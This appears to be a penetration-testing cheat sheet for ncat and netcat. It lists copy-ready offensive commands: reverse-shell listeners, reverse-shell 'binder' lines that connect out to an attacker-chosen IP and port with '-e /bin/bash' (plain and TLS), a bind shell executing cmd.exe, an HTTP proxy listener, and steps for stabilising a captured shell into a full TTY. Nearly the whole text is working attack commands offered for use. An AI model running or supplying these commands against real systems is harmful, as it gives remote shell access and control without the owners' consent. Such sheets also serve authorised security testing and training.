# ncat

% ncat, nmap
#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 

## help
```
https://nmap.org/ncat/guide/index.html
```

## reverse - linux listener
```
rlwrap -cAr nc -lnvp <lport>
```

## reverse - linux listener (TLS)
```
openssl req -new -x509 -keyout test-key.pem -out test-cert.pem.; rlwrap -cAr nc -lnvp --ssl --ssl-cert test-cert.pem --ssl-key test-key.pem <lport>
```

## reverse - linux binder
#plateform/linux
```
ncat -Cnv <ip> <port> -e /bin/bash
```

## reverse - linux binder (TLS)
#plateform/linux
```
ncat -Cnv --ssl <ip> <port> -e /bin/bash
```

## ncat bind shell ssl filtered
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
```

## ncat bind shell ssl connection
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat -v <ip> <port> --ssl
```

## ncat HTTP WEB proxy
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --listen --proxy-type http <port>
```


## full tty (1)  
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## full tty (2)
```
CTRL+Z
``` 

## full tty (3)
```
stty raw -echo ; fg
```

## full tty (4)
TERM=screen
```
export SHELL=/bin/bash; export TERM=xterm-256color ; stty rows <ROWS|38> cols <COLS|116>; reset
```

## no tty
```
see expect
```